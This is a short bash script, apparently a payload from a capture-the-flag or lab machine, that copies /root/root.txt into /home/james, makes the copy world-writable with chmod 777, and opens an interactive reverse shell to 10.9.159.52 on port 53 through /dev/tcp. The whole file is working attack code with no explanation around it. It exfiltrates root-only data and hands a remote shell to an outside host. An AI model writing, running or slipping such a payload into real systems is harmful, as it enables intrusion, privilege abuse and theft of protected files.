#!/bin/bash

cp /root/root.txt /home/james/root.txt

chmod 777 /home/james/root.txt

bash -i >& /dev/tcp/10.9.159.52/53 0>&1
